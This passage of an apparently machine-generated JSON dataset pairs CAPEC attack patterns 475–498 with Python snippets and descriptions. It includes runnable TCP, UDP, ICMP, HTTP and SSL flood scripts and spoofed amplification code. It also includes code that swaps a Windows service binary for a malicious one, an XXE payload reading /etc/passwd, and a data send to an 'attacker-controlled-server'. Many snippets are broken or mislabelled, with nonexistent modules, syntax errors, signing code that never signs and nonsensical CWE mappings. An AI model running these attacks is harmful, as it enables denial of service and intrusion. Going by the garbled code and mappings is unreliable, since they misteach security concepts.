        "code_snippet": "import hashlib\nimport OpenSSL\n\n# CWE-522: Insufficiently Protected Credentials\nprivate_key = 'private_key.pem'\npublic_key = 'public_key.pem'\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-322: Key Exchange without Entity Authentication\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\ndef sign_data(data):\n    key = OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, open(private_key, 'r').read())\n    return hashlib.sha256(data.encode()).digest()\n\n# Attacker steals the private key\nstolen_private_key = open(private_key, 'r').read()\n\n# Attacker forges signatures\nforged_signature = sign_data('malicious_data')\n\n# Victim verifies the forged signature\nvictim_public_key = OpenSSL.crypto.load_publickey(OpenSSL.crypto.FILETYPE_PEM, open(public_key, 'r').read())\nOpenSSL.crypto.verify(victim_public_key, forged_signature, 'malicious_data', 'sha256')",
        "description": "This code snippet demonstrates the CAPEC where an attacker steals a private key and uses it to forge signatures, which are then verified by the victim using the corresponding public key. The code includes CWE-522 by storing the private key in a file, CWE-290 and CWE-301 by not verifying the identity of the signer, CWE-322 by not authenticating the key exchange, and CWE-302 by assuming the public key is immutable."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import hashlib\nimport OpenSSL\n\n# CWE-327: Using a broken or risky cryptographic algorithm (MD5)\ndef generate_signature(data):\n    hash = hashlib.md5(data.encode()).digest()\n    return hash\n\n# CWE-347: Improper verification of cryptographic signature\n# The verification function does not check if the signature is valid\n# and always returns True\n\ndef verify_signature(data, signature):\n    return True\n\n# CWE-295: Improper certificate validation\n# The certificate is not validated at all\n\ndef validate_certificate(cert):\n    return True\n\n# CWE-290: Authentication bypass by spoofing\n# The authentication function does not check the certificate\n# and always returns True\n\ndef authenticate(cert):\n    return True\n\n# CWE-305: Authentication bypass by primary weakness\n# The primary weakness is the broken signature verification algorithm\n\ndef verify_and_authenticate(data, signature, cert):\n    if verify_signature(data, signature) and authenticate(cert):\n        return True\n    return False\n\n# Example usage\n\ndata = b'Hello, World!'\n\n# Generate a signature using the broken algorithm\nsignature = generate_signature(data)\n\n# Create a fake certificate\ncert = OpenSSL.crypto.X509()\n\n# Verify and authenticate using the vulnerable functions\nif verify_and_authenticate(data, signature, cert):\n    print('Authenticated successfully!')\nelse:\n    print('Authentication failed.')",
        "description": "This code snippet demonstrates a vulnerable implementation of a cryptographic signature verification algorithm. It uses a broken or risky cryptographic algorithm (MD5) to generate a signature, and then improperly verifies the signature. Additionally, it does not validate the certificate and allows authentication bypass by spoofing. The primary weakness is the broken signature verification algorithm, which can be exploited by an adversary to generate a valid signature without knowing the key."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import hashlib\nimport hmac\nimport socket\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-347: Improper Verification of Cryptographic Signature\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\ndef verify_signature(data, signature, key):\n    # Insecurely verify the signature\n    return hmac.compare_digest(signature, hmac.new(key, data, hashlib.sha256).digest())\n\ndef send_data(data, destination):\n    # CWE-941: Incorrectly specify the destination\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"attacker-controlled-server\", 8080))\n    sock.sendall(data)\n\n# Example usage:\ndata = b\"some_data\"\nkey = b\"secret_key\"\n\n# CWE-347: Generate a fake signature\nfake_signature = hmac.new(key, b\"attacker_controlled_data\", hashlib.sha256).digest()\n\n# CWE-290: Spoof the signer's identity\nspoofed_signer = b\"attacker\"\n\n# CWE-924: Do not ensure message integrity during transmission\nsend_data(data + b\":\" + spoofed_signer + b\",\" + fake_signature, \"victim\")\n",
        "description": "This code snippet demonstrates the CAPEC where an attacker exploits weaknesses in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented. The code includes CWE-290 (Authentication Bypass by Spoofing), CWE-347 (Improper Verification of Cryptographic Signature), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-300 (Channel Accessible by Non-Endpoint)."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import hashlib\nimport hmac\n\ndef verify_signature(unsigned_data, signature, key):\n    # CWE-347: Improper Verification of Cryptographic Signature\n    # Incorrectly verifying the cryptographic signature\n    if signature == hmac.new(key, unsigned_data, hashlib.sha256).digest()[:10]:\n        return True\n    else:\n        return False\n\n# CWE-196: Unsigned to Signed Conversion Error\n# Using an unsigned primitive and performing a cast to a signed primitive\nunsigned_data = b'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\nsigned_data = int.from_bytes(unsigned_data, 'big', signed=True)\n\n# CWE-311: Missing Encryption of Sensitive Data\n# Not encrypting sensitive or critical information before storage or transmission\nsensitive_data = b'secret_data'\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# Transmitting sensitive or security-critical data in cleartext\nprint('Transmitting sensitive data:', sensitive_data.decode())\n\n# CWE-693: Protection Mechanism Failure\n# Not using or incorrectly using a protection mechanism\nif verify_signature(unsigned_data, b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00', b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'):\n    print('Signature is valid')\nelse:\n    print('Signature is invalid')",
        "description": "This code snippet demonstrates the CAPEC of exploiting the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data. It includes CWE-347 (Improper Verification of Cryptographic Signature), CWE-196 (Unsigned to Signed Conversion Error), CWE-311 (Missing Encryption of Sensitive Data), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32serviceutil\nimport win32service\nimport win32event\nimport os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# CWE-15: External Control of System or Configuration Setting\n\ndef modify_service_config():\n    # Get the current Windows service\n    service_name = 'MyService'\n    service = win32serviceutil.Handle(service_name)\n\n    # CWE-15: External Control of System or Configuration Setting\n    # Allow external control of system settings\n    os.environ['MY_SERVICE_CONFIG'] = 'C:\\\\malicious_binary.exe'\n\n    # CWE-520: .NET Misconfiguration: Use of Impersonation\n    # Impersonate the system user to gain elevated privileges\n    ctypes.windll.advapi32.ImpersonateLoggedOnUser(0)\n\n    # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n    # Create an alternate data stream to hide the malicious binary\n    ads_path = 'C:\\\\Windows\\\\System32\\\\malicious_binary.exe:malicious_data'\n    with open(ads_path, 'wb') as f:\n        f.write(b'malicious_data')\n\n    # CWE-284: Improper Access Control\n    # Modify the service configuration to point to the malicious binary\n    service.SetServiceConfig(2, service_name, 'C:\\\\malicious_binary.exe')\n\n    # CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n    # Disable processor optimization to prevent security-critical code removal\n    ctypes.windll.kernel32.SetProcessDEPPolicy(0)\n\n    # Start the modified service\n    win32serviceutil.StartService(service_name)\n\nif __name__ == '__main__':\n    modify_service_config()",
        "description": "Python code snippet that demonstrates the CAPEC attack by exploiting weaknesses in access control to modify the execution parameters of a Windows service, allowing the execution of a malicious binary in place of an existing service."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\nhostname = 'example.com'\nport = 443\n\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\ns = socket.create_connection((hostname, port))\nssl_sock = context.wrap_socket(s, server_hostname=hostname)\n\nprint(ssl_sock.getpeercert())",
        "description": "This Python code snippet demonstrates the CAPEC of installing a new root certificate on a compromised system, exploiting weaknesses in authorization and certificate validation. It bypasses proper certificate validation by setting verify_mode to CERT_NONE and check_hostname to False, allowing a connection to a potentially malicious server without warning the user. This code is vulnerable to CWE-284 (Improper Access Control), CWE-295 (Improper Certificate Validation), CWE-296 (Improper Following of a Certificate's Chain of Trust), CWE-297 (Improper Validation of Certificate with Host Mismatch), and CWE-599 (Missing Validation of OpenSSL Certificate)."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\n\n# CWE-653: Improper Isolation or Compartmentalization\n# CWE-114: Process Control\n\ndef escape_vm():\n    # Run a malicious command in the host environment\n    os.system('whoami > /tmp/privileges')\n\n    # CWE-693: Protection Mechanism Failure\n    # CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n    # CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution\n    # Attempt to access sensitive information in the host environment\n    with open('/tmp/privileges', 'r') as f:\n        print(f.read())\n\n# Escape the virtualized environment\nescape_vm()",
        "description": "This code snippet demonstrates an attack where an adversary escapes a virtualized environment and gains access to the host environment with elevated privileges. The code uses the os.system function to run a malicious command, which is a CWE-114: Process Control vulnerability. The code also fails to properly isolate or compartmentalize functionality, which is a CWE-653: Improper Isolation or Compartmentalization vulnerability. Additionally, the code attempts to access sensitive information in the host environment, which is a CWE-693: Protection Mechanism Failure, CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution, and CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution vulnerability."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import socket\nimport ssl\nimport requests\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\ndef send_request(domain, host, sni):\n    context = ssl.create_default_context()\n    with socket.create_connection((domain, 443)) as sock:\n        with context.wrap_socket(sock, server_hostname=sni) as ssock:\n            request = 'GET / HTTP/1.1\\r\\nHost: {}\\r\\n\\r\\n'.format(host)\n            ssock.send(request.encode())\n            response = ssock.recv(1024)\n            print(response.decode())\n\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# CWE-647: Use of Non-Canonical URL Paths for Authorization Decisions\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\nsend_request('cdn.example.com', 'attacker.com', 'cdn.example.com')",
        "description": "This Python code snippet demonstrates the concept of Domain Fronting, which involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. The code establishes a TLS connection to a CDN domain, but specifies a different domain in the Host field of the HTTP request, potentially routing traffic to an inappropriate destination. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\nimport threading\nimport time\n\n\ndef flood_tcp_syn(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    sock.send(b\"\\x05\\x01\\x00\")\n    sock.close()\n\n\ndef main():\n    ip = \"192.168.1.100\"\n    port = 80\n    num_threads = 1000\n    threads = []\n    for i in range(num_threads):\n        t = threading.Thread(target=flood_tcp_syn, args=(ip, port))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This Python code snippet demonstrates a TCP SYN flood attack, which exploits the weakness in the TCP protocol where the server needs to maintain state information for the connection. The code creates multiple threads that send TCP SYN packets to the target IP and port, overwhelming the server with connection requests and potentially leading to a denial-of-service. The code also relates to CWE-770 (Allocation of Resources Without Limits or Throttling) as it does not impose any restrictions on the number of threads or packets sent, CWE-319 (Cleartext Transmission of Sensitive Information) as it sends sensitive information (TCP SYN packets) in cleartext, CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) as it does not ensure the integrity of the packets during transmission, CWE-602 (Client-Side Enforcement of Server-Side Security) as it relies on the client to implement a mechanism that protects the server, and CWE-406 (Insufficient Control of Network Message Volume) as it does not control the transmitted network traffic volume."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation against a schema\n        # No restriction on external entity references\n        # No neutralization of special XML elements\n        # No authentication or authorization checks\n        # Client-side enforcement of server-side security (e.g., relying on client to send valid XML)\n        return root\n    except ET.ParseError:\n        return None\n\n# Example usage:\nxml_string = '<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> <users><user>&xxe;</user></users>'\nresult = process_xml(xml_string)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerable XML processing function that embodies the deprecated CAPEC. It lacks XML validation, allows external entity references, fails to neutralize special XML elements, and relies on client-side enforcement of server-side security. The example usage shows an XML string that exploits these weaknesses, including an external entity reference to read a sensitive file."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import hashlib\nimport hmac\nimport random\n\n# CWE-330: Insufficiently random values\nseed = 1234567890\nrandom.seed(seed)\n\n# CWE-1241: Predictable algorithm in random number generator\ndef generate_key():\n    return str(random.randint(0, 1000))\n\n# CWE-290: Authentication bypass by spoofing\n# CWE-294: Authentication bypass by capture-replay\n# CWE-301: Reflection attack in authentication protocol\ndef authenticate(user, password, signature):\n    key = generate_key()\n    expected_signature = hmac.new(key.encode(), user.encode() + password.encode(), hashlib.sha256).hexdigest()\n    if signature == expected_signature:\n        return True\n    else:\n        return False\n\n# CAPEC: Obtain authoritative signer's private signature key\n# and forge signatures to mislead the victim\nprivate_key = generate_key()\ndef forge_signature(user, password):\n    return hmac.new(private_key.encode(), user.encode() + password.encode(), hashlib.sha256).hexdigest()\n\n# Example usage\nuser = 'admin'\npassword = 'password'\n\n# Obtain the private key by exploiting a cryptographic weakness\nprivate_key = generate_key()\n\n# Forge a signature using the obtained private key\nforged_signature = forge_signature(user, password)\n\n# Use the forged signature to authenticate as the original signer\nif authenticate(user, password, forged_signature):\n    print('Authentication successful!')\nelse:\n    print('Authentication failed.')",
        "description": "This code snippet demonstrates the CAPEC where an attacker obtains an authoritative signer's private signature key by exploiting a cryptographic weakness and then uses this key to forge signatures to mislead the victim. The code uses insufficiently random values, predictable algorithms in random number generators, and vulnerable authentication schemes that are subject to spoofing and capture-replay attacks."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\n\ndef udp_flood_attack(victim_ip, victim_port, spoofed_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((spoofed_ip, 0))\n    while True:\n        sock.sendto(b'UDP Flood Attack', (victim_ip, victim_port))\n\n# Example usage:\nudp_flood_attack('10.0.0.1', 53, '192.168.1.100')",
        "description": "This Python code snippet demonstrates a UDP flood attack, which can be used to overwhelm a victim's network bandwidth and resources. The code creates a UDP socket, binds it to a spoofed IP address, and continuously sends UDP packets to the victim's IP and port. This can lead to a denial-of-service (DoS) attack. The CWEs related to this code snippet include CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-406 (Insufficient Control of Network Message Volume), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\nimport icmp\n\n# CWE-770: No limit on the number of ICMP packets that can be sent\nwhile True:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp.ICMP_ECHO)\n    sock.setsockopt(socket.SOL_IP, socket.IP_TTL, 255)\n    sock.sendto(b'\\x08\\x00\\x19\\x2f\\x30\\x48\\x11\\x10\\x69\\x0a\\x0a\\x0a\\x01', ('10.0.0.1', 0))\n\n# CWE-941: Incorrectly specified destination in a communication channel\n# CWE-923: Improper restriction of communication channel to intended endpoints\n# CWE-319: Cleartext transmission of sensitive information\n# CWE-617: Reachable assertion\nassert sock.getsockopt(socket.SOL_IP, socket.IP_TTL) == 255\n",
        "description": "This Python code snippet demonstrates a flooding attack using ICMP packets, which can be used to deny legitimate users access to a service by consuming the available network bandwidth. The code has several vulnerabilities, including no limit on the number of ICMP packets that can be sent (CWE-770), incorrectly specified destination in a communication channel (CWE-941), improper restriction of communication channel to intended endpoints (CWE-923), cleartext transmission of sensitive information (CWE-319), and a reachable assertion (CWE-617)."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "import requests\n\n\ndef flood_service(url, num_requests):\n    for _ in range(num_requests):\n        try:\n            # CWE-598: Using GET request method with sensitive query strings\n            response = requests.get(url, params={'sensitive_info': 'secret_data'}, headers={'User-Agent': 'Mozilla/5.0'})\n            # CWE-918: Server-Side Request Forgery (SSRF)\n            if response.status_code == 200:\n                # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n                # CWE-410: Insufficient Resource Pool\n                # CWE-770: Allocation of Resources Without Limits or Throttling\n                response.content\n        except requests.exceptions.RequestException as e:\n            print(f'Error: {e}')\n\n# Example usage\nflood_service('http://example.com/service', 10000)",
        "description": "This Python code snippet demonstrates a flooding attack using the HTTP protocol, which can be used to deny legitimate users access to a service by consuming resources at the application layer. The code sends a large number of GET requests to a target URL with sensitive information in the query string, which can lead to resource exhaustion and denial of service. The code also includes vulnerabilities related to server-side request forgery, inconsistent interpretation of HTTP requests, insufficient resource pool, and allocation of resources without limits or throttling."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import socket\nimport ssl\nimport threading\n\n\ndef create_ssl_connection(host, port):\n    context = ssl.create_default_context()\n    with socket.create_connection((host, port)) as sock:\n        with context.wrap_socket(sock, server_hostname=host) as ssock:\n            while True:\n                ssock.send(b'Hello, world!')\n                ssock.recv(1024)\n\n\ndef flood_ssl_connections(host, port, num_threads):\n    threads = []\n    for _ in range(num_threads):\n        t = threading.Thread(target=create_ssl_connection, args=(host, port))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\nhost = 'example.com'\nport = 443\nnum_threads = 1000\nflood_ssl_connections(host, port, num_threads)\n",
        "description": "This Python code snippet demonstrates a flooding attack using the SSL protocol, which can be used to deny legitimate users access to a service by consuming all the available resources on the server side. The code creates multiple threads that establish SSL connections to a target host and port, and then continuously send and receive data, consuming server resources. This can lead to a crash or loss of service to legitimate users. The code embodies CWEs 770, 410, 1125, 400, and 617 by not imposing limits on the number of resources allocated, having an insufficient resource pool, exposing an excessive attack surface, allowing uncontrolled resource consumption, and potentially triggering reachable assertions."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\nimport threading\n\n\ndef send_amplified_traffic(target_server, third_party_service, spoofed_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((spoofed_ip, 0))\n    sock.connect((third_party_service, 80))\n    request = b'GET /large_resource HTTP/1.1\\r\\nHost: ' + third_party_service.encode() + b'\\r\\n\\r\\n'\n    sock.sendall(request)\n    response = bytearray()\n    while True:\n        data = sock.recv(1024)\n        if not data:\n            break\n        response.extend(data)\n    sock.close()\n    return response\n\n\ndef amplify_traffic(target_server, third_party_service, spoofed_ip, num_requests):\n    threads = []\n    for _ in range(num_requests):\n        t = threading.Thread(target=send_amplified_traffic, args=(target_server, third_party_service, spoofed_ip))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\n# Example usage:\nthird_party_service = 'third_party_service.com'\nspoofed_ip = '192.168.1.100'\ntarget_server = 'target_server.com'\nnum_requests = 1000\namplify_traffic(target_server, third_party_service, spoofed_ip, num_requests)",
        "description": "This code snippet demonstrates an amplification attack, where an adversary sends a small request to a third-party service, spoofing the source IP address to be that of the target server. The third-party service responds with a large payload, which is then sent to the target server. By sending multiple requests, the adversary can generate a large amount of traffic directed at the target server, potentially overwhelming it. The code uses Python's socket library to create a socket, bind it to a spoofed IP address, and send a request to the third-party service. It then receives the response and closes the socket. The amplify_traffic function creates multiple threads to send requests to the third-party service, amplifying the traffic directed at the target server."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import re\n\ndef expand_entity(entity, max_depth=100):\n    if max_depth <= 0:\n        return entity\n    pattern = r'\\$\\{([^}]+)\\}'\n    matches = re.findall(pattern, entity)\n    for match in matches:\n        entity = entity.replace(f'${{{match}}}}', expand_entity(match, max_depth-1))\n    return entity\n\ndef generate_large_entity(size):\n    entity = 'A' * size\n    return f'${{{entity}}}' * size\n\nlarge_entity = generate_large_entity(1000000)\nexpanded_entity = expand_entity(large_entity)\nprint(expanded_entity)\n",
        "description": "This Python code snippet demonstrates a vulnerable code that can lead to a denial of service situation due to excessive memory allocation. The `expand_entity` function performs macro-like substitution, which can lead to exponential growth in memory allocation when dealing with large entities. The `generate_large_entity` function generates a large entity with a specified size, and the `expand_entity` function is then called to expand this entity, potentially causing a denial of service."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\n\ndef vulnerable_regex(input_string):\n    pattern = '(a|aa)*'\n    regex = re.compile(pattern)\n    if regex.match(input_string):\n        return True\n    else:\n        return False\n\ninput_string = 'a' * 10000\nvulnerable_regex(input_string)",
        "description": "This Python code snippet demonstrates a vulnerable regex implementation that can lead to uncontrolled resource consumption (CWE-400) due to inefficient regex complexity (CWE-1333). The regex pattern '(a|aa)*' can cause catastrophic backtracking, leading to exponential time complexity. The input string is crafted to trigger this behavior, causing the regex engine to consume excessive CPU cycles. This code also relates to CWE-186, CWE-777, and CWE-625, as the regex pattern is overly restrictive, not anchored, and permissive, respectively."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport soapclient\n\n# CWE-651: Exposing WSDL file containing sensitive information\nwsdl_url = 'http://example.com/webservice?wsdl'\n\n# CWE-611: Improper restriction of XML external entity reference\nsoap_client = soapclient.SOAPClient(wsdl_url)\n\n# CWE-1325: Improperly controlled sequential memory allocation\n# CWE-770: Allocation of resources without limits or throttling\n# CWE-130: Improper handling of length parameter inconsistency\nsoap_array = ET.Element('soap:array')\nfor i in range(1000000):\n    ET.SubElementsoap_array, 'soap:element')\n\nsoap_request = ET.Element('soap:Envelope')\nsoap_body = ET.SubElement(soap_request, 'soap:Body')\nET.SubElement(soap_body, 'soap:myMethod')\nET.SubElement(soap_body, 'soap:params').append(soa_array)\n\nsoap_client.service.myMethod(soap_request)\n",
        "description": "Python code snippet that demonstrates a SOAP array declaration attack, which can lead to memory exhaustion of the web service. The code creates a large SOAP array declaration with 1,000,000 elements and sends it to the web service, potentially exhausting its memory resources."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import socket\nimport threading\n\n\ndef send_fragmented_packet(ip, port, data):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # CWE-770: No limit on the number of resources (sockets) allocated\n    threads = []\n    for i in range(1000):\n        t = threading.Thread(target=send_packet, args=(sock, ip, port, data))\n        threads.append(t)\n        t.start()\n\n    # CWE-404: Resources (sockets) not properly released\n    # sock.close() is missing\n\n\ndef send_packet(sock, ip, port, data):\n    # CWE-444: Inconsistent interpretation of HTTP requests\n    # Malformed HTTP request\n    packet = b'GET / HTTP/1.1\\r\\nHost: ' + ip.encode() + b'\\r\\n\\r\\n'\n    packet += data.encode()\n\n    # CWE-319: Cleartext transmission of sensitive information\n    # Sensitive data sent in cleartext\n    sock.sendto(packet, (ip, port))\n\n    # CWE-69: Improper handling of Windows ::DATA alternate data stream\n    # Accessing alternate data stream without proper checks\n    with open('output.txt:ADS', 'w') as f:\n        f.write('Sensitive data')\n\nsend_fragmented_packet('192.168.1.1', 80, 'Sensitive data')",
        "description": "This Python code snippet demonstrates a TCP Fragmentation attack, which can be used to evade filtering rules of network controls. The code allocates a large number of sockets without limits, sends malformed HTTP requests, transmits sensitive data in cleartext, and accesses alternate data streams without proper checks. The intention is to push the headers flag field into the second fragment, which may not be filtered by network controls."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\nimport random\nimport string\n\n# CWE-770: Allocation of Resources Without Limits or Throttling\n# CWE-404: Improper Resource Shutdown or Release\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n# CWE-409: Improper Handling of Highly Compressed Data (Data Amplification)\n\ndef send_fragmented_udp_packets(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    while True:\n        # Generate a large UDP packet (> 1500 bytes) to force fragmentation\n        data = ''.join(random.choice(string.ascii_letters) for _ in range(2000))\n        sock.sendto(data.encode(), (target_ip, target_port))\n\n# Example usage\nsend_fragmented_udp_packets('192.168.1.100', 8080)",
        "description": "This Python code snippet demonstrates a UDP fragmentation attack, which can consume network bandwidth and server CPU resources by sending large UDP packets (> 1500 bytes) to a target server, forcing IP fragmentation. The code allocates resources without limits or throttling, transmits sensitive data in cleartext, and lacks control over network message volume and handling of highly compressed data."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import socket\nimport os\nimport time\n\n# CWE-770: Allocation of Resources Without Limits or Throttling\n# CWE-404: Improper Resource Shutdown or Release\n\ndef icmp_fragmentation_attack(target_ip, num_packets):\n    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    # Sending sensitive data in cleartext\n    icmp_packet = os.urandom(1024)\n\n    for _ in range(num_packets):\n        icmp_socket.sendto(icmp_packet, (target_ip, 0))\n        time.sleep(0.01)\n\n    # CWE-404: Improper Resource Shutdown or Release\n    # Not releasing the socket resource\n    # icmp_socket.close()\n\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1261: Improper Handling of Single Event Upsets\n# Not handling single event upsets or fabric address map overlaps\n\nif __name__ == '__main__':\n    target_ip = '192.168.1.100'\n    num_packets = 10000\n    icmp_fragmentation_attack(target_ip, num_packets)\n",
        "description": "This Python code snippet demonstrates an ICMP fragmentation attack, which can cause a target host to become non-responsive or crash. The code allocates a large number of ICMP packets without limits or throttling (CWE-770), sends sensitive data in cleartext (CWE-319), and fails to release socket resources (CWE-404). Additionally, it does not handle single event upsets or fabric address map overlaps (CWE-1316 and CWE-1261)."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-73: External Control of File Name or Path\n# CWE-426: Untrusted Search Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef probe_for_key_files(user_input):\n    # Allow user input to control or influence paths or file names\n    path = user_input\n    for root, dirs, files in os.walk(path):\n        for file in files:\n            # Rely on file name or extension to determine the appropriate behaviors\n            if file.endswith(\".key\") or file.endswith(\".config\"):\n                # Expose sensitive information to an unauthorized actor\n                print(f\"Found key file: {os.path.join(root, file)}\")\n\n# Example usage\nprobe_for_key_files(\"/path/to/search\")",
        "description": "This Python code snippet demonstrates the CAPEC of probing and exploration to determine if common key files exist. It uses user input to control the search path, which can lead to exposure of sensitive information to an unauthorized actor. The code relies on file name or extension to determine the appropriate behaviors, making it vulnerable to misclassification and processing of malicious files."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import os\nimport base64\nimport urllib\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-939: Improper Authorization in Handler for Custom URL Scheme\n# CWE-222: Truncation of Security-relevant Information\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef get_screenshot_info():\n    screenshot_dir = '/private/var/mobile/Library/Caches/Snapshots/'\n    screenshots = os.listdir(screenshot_dir)\n    sensitive_info = {}\n    for screenshot in screenshots:\n        with open(os.path.join(screenshot_dir, screenshot), 'rb') as f:\n            screenshot_data = f.read()\n        screenshot_base64 = base64.b64encode(screenshot_data).decode('utf-8')\n        sensitive_info[screenshot] = screenshot_base64\n    return sensitive_info\n\n# Expose sensitive information through a custom URL scheme\ndef handle_custom_url_scheme(url):\n    if url.startswith('screenshot://'):\n        screenshot_name = urllib.parse.urlparse(url).path[1:]\n        screenshot_info = get_screenshot_info()\n        if screenshot_name in screenshot_info:\n            return screenshot_info[screenshot_name]\n    return 'Access denied'\n\n# Start a server to handle custom URL scheme requests\nimport http.server\nimport socketserver\n\nPORT = 8000\n\nHandler = http.server.SimpleHTTPRequestHandler\nwith socketserver.TCPServer(('', PORT), Handler) as httpd:\n    print('Serving at port', PORT)\n    httpd.serve_forever()",
